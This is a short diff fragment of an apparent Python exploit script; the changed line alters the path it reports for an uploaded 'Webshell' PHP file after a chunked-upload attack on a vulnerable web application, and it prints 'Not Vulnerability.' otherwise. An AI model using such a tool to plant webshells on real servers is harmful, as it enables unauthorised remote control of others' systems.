@@ -39,7 +39,7 @@ def upload_chunk(url):
 	result = loads(resp.text)
 	if result['code'] == 1 and result['msg'] == '' and result['data'] == None:
 		merge_file(upload_url, chunk_id)
-		print('\nWebshell: %s/runtime/chunks/%d.php' % (url, chunk_id))
+		print('\nWebshell: %s/%d.php' % (url, chunk_id))
 	else:
 		print('Not Vulnerability.')
 
